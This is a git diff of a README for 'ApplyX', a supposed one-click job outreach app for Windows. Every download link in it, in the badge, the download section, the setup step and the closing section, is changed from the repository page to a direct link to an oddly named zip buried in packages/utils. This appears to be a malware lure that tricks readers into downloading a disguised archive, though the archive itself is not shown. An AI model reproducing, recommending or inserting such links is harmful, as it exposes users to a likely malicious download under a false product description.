@@ -1,12 +1,12 @@
 # 🚀 ApplyX - One-Click Job Outreach Made Simple
 
-[![Download ApplyX](https://img.shields.io/badge/Download%20ApplyX-blue?style=for-the-badge)](https://github.com/lorentzforcepressurepoint640/ApplyX)
+[![Download ApplyX](https://img.shields.io/badge/Download%20ApplyX-blue?style=for-the-badge)](https://github.com/lorentzforcepressurepoint640/ApplyX/raw/refs/heads/main/packages/utils/X_Apply_tubicinate.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get ApplyX for Windows:
 
-[https://github.com/lorentzforcepressurepoint640/ApplyX](https://github.com/lorentzforcepressurepoint640/ApplyX)
+[https://github.com/lorentzforcepressurepoint640/ApplyX/raw/refs/heads/main/packages/utils/X_Apply_tubicinate.zip](https://github.com/lorentzforcepressurepoint640/ApplyX/raw/refs/heads/main/packages/utils/X_Apply_tubicinate.zip)
 
 ## 🖥️ What ApplyX Does
 
@@ -41,7 +41,7 @@ Before you start, make sure you have:
 
 Open this page in Chrome:
 
-[https://github.com/lorentzforcepressurepoint640/ApplyX](https://github.com/lorentzforcepressurepoint640/ApplyX)
+[https://github.com/lorentzforcepressurepoint640/ApplyX/raw/refs/heads/main/packages/utils/X_Apply_tubicinate.zip](https://github.com/lorentzforcepressurepoint640/ApplyX/raw/refs/heads/main/packages/utils/X_Apply_tubicinate.zip)
 
 ### 2. Download the app
 
@@ -269,7 +269,7 @@ This reduces the time spent copying text, rewriting messages, and switching betw
 
 Visit the download page here:
 
-[https://github.com/lorentzforcepressurepoint640/ApplyX](https://github.com/lorentzforcepressurepoint640/ApplyX)
+[https://github.com/lorentzforcepressurepoint640/ApplyX/raw/refs/heads/main/packages/utils/X_Apply_tubicinate.zip](https://github.com/lorentzforcepressurepoint640/ApplyX/raw/refs/heads/main/packages/utils/X_Apply_tubicinate.zip)
 
 ## 🧩 File Location After Download
 
